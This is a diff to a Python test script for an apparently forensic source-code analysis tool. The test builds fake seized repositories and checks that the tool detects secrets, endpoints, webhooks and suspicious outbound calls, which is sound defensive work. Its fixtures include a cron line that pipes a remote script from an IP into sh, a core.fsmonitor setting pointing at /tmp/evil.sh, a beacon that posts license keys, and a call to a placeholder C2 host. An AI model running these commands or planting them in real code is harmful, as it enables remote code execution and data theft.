@@ -1,6 +1,9 @@
 """The source-code stage on a small export tree with two git repositories, configuration and code (review-driven):
 repositories read without loading the seized config, deleted secrets recovered from history, endpoints classified,
-configuration database names matched to an extracted database, and the result searchable as a "code" export.
+outbound calls (curl/fetch/requests, sockets, mail, shell curl|sh, Telegram/Discord notifies, license/heartbeat checks,
+cron fetches, including variable hosts resolved from config), inbound webhook/IPN handlers, per-provider pivot sheet
+(what is sent, which credential/account it uses, what that provider holds), configuration database names matched to an
+extracted database, and the result searchable as a "code" export.
 `python tests/code_check.py` - needs git in PATH; no model, evidence or network."""
 import csv, json, os, shutil, subprocess, sys, tempfile
 from pathlib import Path
@@ -33,18 +36,77 @@ if not shutil.which("git"):
 
 tmp = Path(tempfile.mkdtemp(prefix="gc-"))
 src = tmp / "source_code"
-# repo 1: ep — a deleted .env secret, a dangerous config key, a Telegram token in code, an AGENTS.md
+# repo 1: ep — a deleted .env secret, a dangerous config key, a Telegram token in code, an AGENTS.md,
+# plus outbound calls (variable-host curl, Telegram notify, SMS file_get_contents, license/heartbeat beacon,
+# mail, socket, cron curl|sh, multiline Python f-string requests.post, unconfigured env var call) and
+# inbound webhook/IPN handlers (Perfect Money IPN + multi-route Stripe & Telegram controller).
 ep = src / "ep"
 (ep / "config").mkdir(parents=True)
 (ep / "src").mkdir()
+(ep / "public").mkdir()
 git(ep, "init", "-q", "-b", "main")
 git(ep, "remote", "add", "origin", "https://ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@github.com/ecopanel/ep.git")
 (ep / ".env").write_text("APP_ENV=prod\nDB_HOST=127.0.0.1\nDB_DATABASE=sw\nDB_USERNAME=app\nDB_PASSWORD=S3cretDbPass!\n"
                          "TELEGRAM_BOT_TOKEN=7111111111:AAHfiqksKZ8WmR2zSjiQ7_v4TVAKyXg9w1Abcd\nAFTERSHIP_API_KEY=asat_0123456789abcdef0123456789abcdef\n"
-                         "SMS_ACTIVATE_KEY=0123456789abcdef0123456789abcdef\n", "utf-8")
+                         "SMS_ACTIVATE_KEY=0123456789abcdef0123456789abcdef\nGATEWAY_HOST=api.stripe.com\nOPENAI_API_KEY=sk-proj-1234567890abcdefghijklmnop\n", "utf-8")
 (ep / "AGENTS.md").write_text("# Instructions for the coding agent\nUse Symfony. The bot lives in EcopanelBot.\n", "utf-8")
-(ep / "src" / "Bot.php").write_text("<?php\n// talks to Telegram and the SMS provider\n$u='https://api.telegram.org/bot7222222222:BBHfiqksKZ8WmR2zSjiQ7_v4TVAKyXg9w1Axyz/sendMessage';\n"
-                                    "$sms='https://api.sms-activate.org/stubs/handler_api.php';\n$ip='http://185.220.101.5:8080/gate';\n$admin='admin@ecopanel.su';\n", "utf-8")
+(ep / "src" / "Bot.php").write_text(
+    "<?php\n// talks to Telegram, SMS provider, variable-configured payment gateway, license gate, socket and mail\n"
+    "$u='https://api.telegram.org/bot7222222222:BBHfiqksKZ8WmR2zSjiQ7_v4TVAKyXg9w1Axyz/sendMessage';\n"
+    "$sms='https://api.sms-activate.org/stubs/handler_api.php?action=getNumber&service=tg';\n"
+    "$ip='http://185.220.101.5:8080/gate';\n$admin='admin@ecopanel.su';\n"
+    "$gw = getenv('GATEWAY_HOST');\n"
+    "$ch = curl_init('https://' . env('GATEWAY_HOST', 'fallback.stripe.com') . '/v1/charges');\n"
+    "curl_setopt($ch, CURLOPT_POST, 1);\n"
+    "curl_setopt($ch, CURLOPT_POSTFIELDS, ['amount' => $amount, 'card_token' => $card]);\n"
+    "curl_exec($ch);\n"
+    "$res = file_get_contents($sms);\n"
+    "$hb = curl_init($ip);\n"
+    "curl_setopt($hb, CURLOPT_POSTFIELDS, ['license_key' => $lic, 'domain' => $_SERVER['HTTP_HOST']]);\n"
+    "curl_exec($hb);\n"
+    "$sock = fsockopen('185.220.101.5', 8080);\n"
+    "mail($admin, 'Order notification', $body);\n",
+    "utf-8",
+)
+(ep / "public" / "ipn.php").write_text(
+    "<?php\n// Inbound Perfect Money IPN handler\n"
+    "$batch = $_POST['PAYMENT_BATCH_NUM'];\n"
+    "$payee = $_POST['PAYEE_ACCOUNT'];\n"
+    "$amt = $_POST['PAYMENT_AMOUNT'];\n"
+    "if ($_POST['V2_HASH'] === $expected) { echo 'OK'; }\n",
+    "utf-8",
+)
+(ep / "src" / "WebhookController.php").write_text(
+    "<?php\nclass WebhookController {\n"
+    "  #[Route('/webhook/stripe', methods: ['POST'])]\n"
+    "  public function stripe() {\n"
+    "    $sig = $_SERVER['HTTP_STRIPE_SIGNATURE'] ?? '';\n"
+    "    $evt = $_POST['checkout_session_id'];\n"
+    "  }\n"
+    "  #[Route('/webhook/telegram', methods: ['POST'])]\n"
+    "  public function handle() {\n"
+    "    $sig = $_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN'] ?? '';\n"
+    "    $update = json_decode(file_get_contents('php://input'), true);\n"
+    "    $uid = $update['update_id'];\n"
+    "    $chatId = $update['message']['chat']['id'] ?? $update['callback_query']['id'];\n"
+    "  }\n"
+    "}\n",
+    "utf-8",
+)
+(ep / "src" / "sync.py").write_text(
+    "import os, requests\n"
+    "url = f'https://{os.getenv(\"GATEWAY_HOST\", \"api.stripe.com\")}/v1/customers'\n"
+    "requests.post(\n"
+    "    url,\n"
+    "    json={'email': customer_email, 'plan': plan_id},\n"
+    ")\n"
+    "requests.get(f'https://{os.getenv(\"UNSET_C2_HOST\")}/ping')\n",
+    "utf-8",
+)
+(ep / "crontab").write_text(
+    "*/10 * * * * root curl -fsSL https://185.220.101.5:8080/beacon.sh | sh\n",
+    "utf-8",
+)
 (ep / "composer.json").write_text(json.dumps({"name": "ecopanel/ep", "require": {"symfony/framework-bundle": "^6.4", "aftership/aftership-sdk-php": "^2.0"}}), "utf-8")
 (ep / "config" / "services.yaml").write_text("parameters:\n  telegram:\n    token: 7333333333:CCHfiqksKZ8WmR2zSjiQ7_v4TVAKyXg9w1Auvw\n  payments:\n    perfect_money: PM-ACCT-1234\n", "utf-8")
 git(ep, "add", "-A")
@@ -55,7 +117,8 @@ git(ep, "rm", "-q", "--cached", ".env")
 git(ep, "add", "-A")
 git(ep, "commit", "-q", "-m", "stop tracking .env", env={"D": "2026-02-05T09:30:00-0500", "N": "Vlad Two", "E": "vlad@protonmail.com"})
 (ep / ".env").write_text("APP_ENV=prod\nDB_HOST=127.0.0.1\nDB_DATABASE=sw\nDB_USERNAME=app\nDB_PASSWORD=RotatedPass2026!\n"
-                         "TELEGRAM_BOT_TOKEN=7111111111:AAHfiqksKZ8WmR2zSjiQ7_v4TVAKyXg9w1Abcd\n", "utf-8")   # rotated on disk, not committed
+                         "TELEGRAM_BOT_TOKEN=7111111111:AAHfiqksKZ8WmR2zSjiQ7_v4TVAKyXg9w1Abcd\nGATEWAY_HOST=api.stripe.com\n"
+                         "AFTERSHIP_API_KEY=asat_0123456789abcdef0123456789abcdef\nOPENAI_API_KEY=sk-proj-1234567890abcdefghijklmnop\n", "utf-8")
 # a dangerous local config key, and a reflog entry from a reset
 subprocess.run(["git", "config", "core.fsmonitor", "/tmp/evil.sh"], cwd=ep, check=True, capture_output=True,
                env=dict(os.environ, GIT_CONFIG_GLOBAL="/dev/null", GIT_CONFIG_SYSTEM="/dev/null"))
@@ -70,7 +133,8 @@ bot = src / "EcopanelBot"
 git(bot, "init", "-q", "-b", "main")
 git(bot, "remote", "add", "origin", "git@github.com:ecopanel/EcopanelBot.git")
 (bot / ".env").write_text("BOT_TOKEN=7444444444:DDHfiqksKZ8WmR2zSjiQ7_v4TVAKyXg9w1Arst\nMYSQL_DATABASE=ewmanager\nPROXY=socks5://user:pass@185.100.87.202:9050\n", "utf-8")
-(bot / "setup.php").write_text("<?php $db='mysql://bot:pw@127.0.0.1/ewmanager'; $track='https://api.aftership.com/v4/trackings';\n", "utf-8")
+(bot / "setup.php").write_text("<?php $db='mysql://bot:pw@127.0.0.1/ewmanager'; $track='https://api.aftership.com/v4/trackings';\n"
+                               "$ch=curl_init($track); curl_setopt($ch, CURLOPT_HTTPHEADER, ['as-api-key: ' . getenv('AFTERSHIP_API_KEY')]); curl_exec($ch);\n", "utf-8")
 git(bot, "add", "-A")
 git(bot, "commit", "-q", "-m", "bot", env={"D": "2026-02-02T12:00:00+0300", "N": "Dev One", "E": "dev1@ecopanel.su"})
 
@@ -118,6 +182,7 @@ by_host = {e["host"]: e for e in eps}
 check("Telegram endpoint classified messaging", by_host.get("api.telegram.org", {}).get("class") == "messaging")
 check("SMS-activate endpoint classified sms", by_host.get("api.sms-activate.org", {}).get("class") == "sms")
 check("AfterShip endpoint classified shipping", by_host.get("api.aftership.com", {}).get("class") == "shipping")
+check("variable-resolved host from config (api.stripe.com) added to endpoints", by_host.get("api.stripe.com", {}).get("class") == "payments", str(list(by_host)))
 check("public IP:port endpoint kept and classed ip", any(h.startswith("185.220.101.5") for h in by_host) and by_host[next(h for h in by_host if h.startswith('185.220.101.5'))]["class"] == "ip", str(list(by_host)))
 check("GitHub is code-hosting, jsdelivr-style CDN would be noise", by_host.get("github.com", {}).get("class") in ("code-hosting", None))
 
@@ -128,10 +193,68 @@ check("database connections parsed (sw and ewmanager)", {d["database"] for d in 
 links = rows("config", "export_links")
 check("config DB names matched to the extracted exports", {l["database"] for l in links} >= {"sw", "ewmanager"}, str([(l["database"], l["export"]) for l in links]))
 
+# build s: outbound calls, variable hosts, inbound webhooks/IPNs, and per-provider pivot sheet
+calls = rows("code", "calls")
+check("variable-host curl call resolved GATEWAY_HOST -> api.stripe.com with POST method and payload keys",
+      any(c["host"] == "api.stripe.com" and c["method"] == "POST" and "GATEWAY_HOST" in c["resolved_from"] and "amount" in c["payload"] for c in calls),
+      str([(c["host"], c["method"], c["resolved_from"], c["payload"]) for c in calls]))
+check("file_get_contents call to variable $sms resolved to api.sms-activate.org",
+      any(c["host"] == "api.sms-activate.org" and "file_get_contents" in c["mechanism"] for c in calls),
+      str([(c["host"], c["mechanism"]) for c in calls]))
+check("license / heartbeat beacon call detected with payload fields",
+      any("185.220.101.5" in c["host"] and ("license-check" in c["flags"] or "heartbeat" in c["flags"]) and "license_key" in c["payload"] for c in calls),
+      str([(c["host"], c["flags"], c["payload"]) for c in calls]))
+check("cron curl|sh fetch-and-execute detected",
+      any("shell-pipe-exec" in c["flags"] and "cron" in c["flags"] and "*/10 * * * *" in c["payload"] for c in calls),
+      str([(c["mechanism"], c["flags"], c["payload"]) for c in calls]))
+check("socket (fsockopen) and mail() calls recorded",
+      any(c["kind"] == "socket" and "185.220.101.5" in c["host"] for c in calls) and any(c["kind"] == "mail" for c in calls),
+      str([(c["kind"], c["mechanism"], c["host"]) for c in calls]))
+
+webhooks = rows("code", "webhooks")
+check("inbound Perfect Money IPN handler detected with V2_HASH verification and POST fields",
+      any(w["service"] == "perfect money" and "V2_HASH" in w["verification"] and "PAYMENT_BATCH_NUM" in w["payload_fields"] for w in webhooks),
+      str([(w["service"], w["verification"], w["payload_fields"]) for w in webhooks]))
+check("inbound Telegram bot webhook route /webhook/telegram detected",
+      any(w["service"] == "telegram" and w["route_or_script"] == "/webhook/telegram" for w in webhooks),
+      str([(w["service"], w["route_or_script"], w["verification"]) for w in webhooks]))
+
+pivots = rows("code", "pivots")
+by_prov = {p["provider"]: p for p in pivots}
+check("pivot sheet has Telegram with direction=both, bot_ids extracted, credentials and provider_holds",
+      "telegram" in by_prov and by_prov["telegram"]["direction"] == "both" and "bot_id:7111111111" in by_prov["telegram"]["accounts_or_ids"]
+      and "bot_id:7222222222" in by_prov["telegram"]["accounts_or_ids"] and "webhook" in by_prov["telegram"]["provider_holds"].lower(),
+      str(by_prov.get("telegram")))
+check("pivot sheet joins historical-only SMS-Activate credential to live outbound call",
+      "sms-activate" in by_prov and by_prov["sms-activate"]["history_only"] == "True" and int(by_prov["sms-activate"]["calls_n"]) >= 1
+      and "SMS_ACTIVATE_KEY" in by_prov["sms-activate"]["credential_keys"],
+      str(by_prov.get("sms-activate")))
+check("pivot sheet links Perfect Money account ID PM-ACCT-1234 and inbound IPN handler",
+      "perfect money" in by_prov and "PM-ACCT-1234" in by_prov["perfect money"]["accounts_or_ids"] and int(by_prov["perfect money"]["webhooks_n"]) >= 1,
+      str(by_prov.get("perfect money")))
+check("pivot sheet includes AfterShip with API key, outbound call and what the provider holds",
+      "aftership" in by_prov and "AFTERSHIP_API_KEY" in by_prov["aftership"]["credential_keys"] and "tracking" in by_prov["aftership"]["provider_holds"].lower(),
+      str(by_prov.get("aftership")))
+check("multiline Python f-string requests.post resolved clean URL without f-prefix or braces",
+      any(c["file"].endswith("sync.py") and c["url_or_target"] == "https://api.stripe.com/v1/customers" and c["method"] == "POST" for c in calls),
+      str([c for c in calls if c["file"].endswith("sync.py")]))
+check("unconfigured variable host recorded as (config:UNSET_C2_HOST) in calls without polluting endpoints",
+      any(c["host"] == "(config:UNSET_C2_HOST)" for c in calls) and not any("unset_c2" in h.lower() for h in by_host),
+      str(([(c["host"], c["url_or_target"]) for c in calls if "UNSET" in c["host"]], list(by_host))))
+check("multi-route controller assigns /webhook/stripe and /webhook/telegram to their own handlers without duplicate Telegram rows",
+      len([w for w in webhooks if w["file"].endswith("WebhookController.php")]) == 2
+      and any(w["service"] == "stripe" and w["route_or_script"] == "/webhook/stripe" for w in webhooks)
+      and any(w["service"] == "telegram" and w["route_or_script"] == "/webhook/telegram" for w in webhooks),
+      str([w for w in webhooks if w["file"].endswith("WebhookController.php")]))
+check("dormant config-only credential (OpenAI) appears in pivots with direction=dormant (config only)",
+      by_prov.get("openai", {}).get("direction") == "dormant (config only)" and "OPENAI_API_KEY" in by_prov.get("openai", {}).get("credential_keys", ""),
+      str(by_prov.get("openai")))
+
 # the code export is a first-class export: catalog and search see it
 cat = dbexplore.catalog(case)
 code_tables = {t["table"] for t in cat if t["export"] == code["export"]}
-check("the code export is in the Databases-tab catalog", {"commits", "endpoints", "values", "repositories"} <= code_tables, str(sorted(code_tables)))
+check("the code export is in the Databases-tab catalog (including calls, webhooks, pivots)",
+      {"commits", "endpoints", "values", "repositories", "calls", "webhooks", "pivots"} <= code_tables, str(sorted(code_tables)))
 hits = dbexplore.search_counts(case, "protonmail", "phrase", cat=cat)
 check("searching the case finds the developer's e-mail in the code export", any(h["export"] == code["export"] for h in hits), str(hits))
 
@@ -145,8 +268,9 @@ check("the app record carries the git remote", epapp and epapp.get("repo", {}).g
 # findings
 fids = [f for f in case.read_findings() if str(f.get("rule", "")).startswith("code.")]
 rules = {f["rule"] for f in fids}
-check("findings cover repo, git-config command, history secret, endpoint, database link",
-      {"code.repo", "code.git_config_command", "code.history_secret", "code.endpoint_service", "code.database_link"} <= rules, str(sorted(rules)))
+check("findings cover repo, git-config command, history secret, endpoint, database link, shell_fetch_exec, license_or_beacon, variable_host_call, webhook_handler, pivot",
+      {"code.repo", "code.git_config_command", "code.history_secret", "code.endpoint_service", "code.database_link",
+       "code.shell_fetch_exec", "code.license_or_beacon", "code.variable_host_call", "code.webhook_handler", "code.pivot"} <= rules, str(sorted(rules)))
 
 shutil.rmtree(tmp, ignore_errors=True)
 print("code check:", "OK" if ok else "FAILED")
